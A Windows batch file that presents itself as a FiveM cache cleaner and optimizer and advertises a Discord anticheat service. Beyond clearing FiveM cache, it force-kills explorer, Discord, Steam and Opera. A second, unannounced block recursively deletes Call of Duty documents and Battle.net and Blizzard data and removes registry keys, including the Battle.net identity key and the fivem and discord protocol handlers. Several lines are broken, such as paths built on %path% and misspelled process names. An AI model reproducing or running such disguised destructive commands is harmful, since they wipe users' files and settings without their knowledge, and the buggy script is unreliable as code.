@echo off
title FiveM Tools - WaveShield - discord.gg/CXZwrZx
color c
 
echo You Need a FiveM Anticheat ? WaveShield is here : discord.gg/CXZwrZx 
echo Press Any Key to optimize FiveM and Clear the cache
pause >nul
cls


echo Clearing FiveM Cache...
TIMEOUT /T 1
rmdir /s /q "%LocalAppData%\FiveM\FiveM.app\cache\browser"
rmdir /s /q "%LocalAppData%\FiveM\FiveM.app\cache\db"
rmdir /s /q "%LocalAppData%\FiveM\FiveM.app\cache\priv"
rmdir /s /q "%LocalAppData%\FiveM\FiveM.app\cache\servers"
rmdir /s /q "%LocalAppData%\FiveM\FiveM.app\cache\subprocess"
rmdir /s /q "%LocalAppData%\FiveM\FiveM.app\cache\unconfirmed"
del /s /q /f "%LocalAppData%\FiveM\FiveM.app\crashometry"
del /s /q /f "%LocalAppData%\FiveM\FiveM.app\launcher_skip_mtl2"
del /s /q /f "%LocalAppData%\FiveM\FiveM.app\session"
del /s /q "%LocalAppData%\FiveM\FiveM.app\plugins"
rmdir /s /q "%LocalAppData%\FiveM\FiveM.app\mods"
rmdir /s /q "%LocalAppData%\FiveM\FiveM.app\logs"
rmdir /s /q "%LocalAppData%\FiveM\FiveM.app\crashes"



..TIMEOUT /T 1
taskkill /f /im GTAVLauncher.exe
taskkill /IM explorer.exe /F
wmic process where name="FiveM.exe" CALL setpriority 128
wmic process where name="FiveM_b2189_GTAProcess.exe" CALL setpriority 128
taskkill /f /im wmpnetwk.exe.exe
taskkill /f /im speedfan.exe
taskkill /f /im TeamWiever_Service.exe
taskkill /f /im opera.exe
taskkill /f /im discord.exe
taskkill /f /im steam.exe
taskkill /f /im fivem.exe
taskkill /f /im steamwebhelper.exe

TIMEOUT /T 1
color c
cls 
echo Optimized and Cleared cache, this script was created by ayznnnn#3964
echo You Need a FiveM Anticheat ? WaveShield is here : https://discord.gg/9pdnvncat3

set ip = %random%
set /p ip= "You can now enter the server ip address to connect:"
echo Connecting to %ip% ...
start "" "fivem://connect/%ip%"
timeout /t 10 /nobreak

@echo off
rmdir "%userprofile%\documents\Call of Duty Modern Warfare" /s /q
rmdir "%localappdata%\Battle.net" /s /q
rmdir "%localappdata%\Blizzard Entertainment" /s /q
rmdir "%appdata%\Battle.net" /s /q
rmdir "%programdata%\Battle.net" /s /q
del /s /f "%path%\Users\%username%\Documents\Call of Duty Black Ops Cold War\report"
del /s /f "%path%\Users\%username%\Documents\Call of Duty Black Ops Cold War"
del /s /f "%path%\Users\%username%\AppData\Local\Battle.net\BrowserCache"
del /s /f "%path%\Users\%username%\AppData\Local\Battle.net\BrowserCache\GPUCache"
del /s /f "%path%\Users\%username%\AppData\Local\Battle.net\BrowserCache\GPUCache\data_0.dcache"
del /s /f "%path%\Users\%username%\AppData\Local\Battle.net\BrowserCache\GPUCache\data_1.dcache"
del /s /f "%path%\Users\%username%\AppData\Local\Battle.net\BrowserCache\GPUCache\data_2.dcache"
del /s /f "%path%\Users\%username%\AppData\Local\Battle.net\BrowserCache\GPUCache\data_3.dcache"
del /s /f "%path%\Users\%username%\AppData\Local\Battle.net\BrowserCache\GPUCache\f_000001.dcache"
del /s /f "%path%\Users\%username%\AppData\Local\Battle.net\BrowserCache\GPUCache\index.dcache"
del /s /f "%path%\Users\%username%\AppData\Local\Battle.net\BrowserCache\Cache\index"
del /s /f "%path%\Users\%username%\AppData\Local\Battle.net\BrowserCache\GPUCache\data_0"
del /s /f "%path%\Users\%username%\AppData\Local\Battle.net\BrowserCache\GPUCache\data_1"
del /s /f "%path%\Users\%username%\AppData\Local\Battle.net\BrowserCache\GPUCache\data_2"
del /s /f "%path%\Users\%username%\AppData\Local\Battle.net\BrowserCache\GPUCache\data_3"
del /s /f "%path%\Users\%username%\AppData\Local\Battle.net\BrowserCache\GPUCache\f_000001"
del /s /f "%path%\Users\%username%\AppData\Local\Battle.net\BrowserCache\GPUCache\index"
del /s /f "%path%\Users\%username%\AppData\Local\Battle.net\BrowserCache\Cache\index.dcache"
del /s /f "%path%\Users\%username%\AppData\Local\Battle.net\BrowserCache\Cache\data_0.dcache"
del /s /f "%path%\Users\%username%\AppData\Local\Battle.net\BrowserCache\Cache\data_1.dcache"
del /s /f "%path%\Users\%username%\AppData\Local\Battle.net\BrowserCache\Cache\data_2.dcache"
del /s /f "%path%\Users\%username%\AppData\Local\Battle.net\BrowserCache\Cache\data_3.dcache"
del /s /f "%path%\Users\%username%\AppData\Local\Battle.net\BrowserCache\Cache\data_0"
del /s /f "%path%\Users\%username%\AppData\Local\Battle.net\BrowserCache\Cache\data_1"
del /s /f "%path%\Users\%username%\AppData\Local\Battle.net\BrowserCache\Cache\data_2"
del /s /f "%path%\Users\%username%\AppData\Local\Battle.net\BrowserCache\Cache\data_3"
del /s /f "%path%\Users\%username%\AppData\Local\Battle.net\Cache"
del /s /f "%path%\Users\%username%\AppData\Local\Battle.net\Logs"
del /s /f "%path%\Users\%username%\AppData\Local\Battle.net\WidevineCdm"
del /s /f "%path%\Users\%username%\AppData\Local\Battle.net\CachedData"
del /s /f "%path%\Users\%username%\AppData\Local\Blizzard Entertainment"
del /s /f "%path%\Users\%username%\AppData\Roaming\Battle.net"
del /s /f "%path%\ProgramData\Battle.net"
del /s /f "%path%\ProgramData\Blizzard Entertainment"
reg delete "HKEY_CURRENT_USER\Software\Blizzard Entertainment" /f
reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Blizzard Entertainment" /f
reg delete "HKEY_CURRENT_USER\Software\Blizzard Entertainment\Battle.net\Identity" /f
reg delete "HKEY_CLASSES_ROOT\fivem" /f
reg delete "HKEY_CLASSES_ROOT\discord" /f
reg delete "HKEY_CLASSES_ROOT\fivem_process" /f
exit


exit
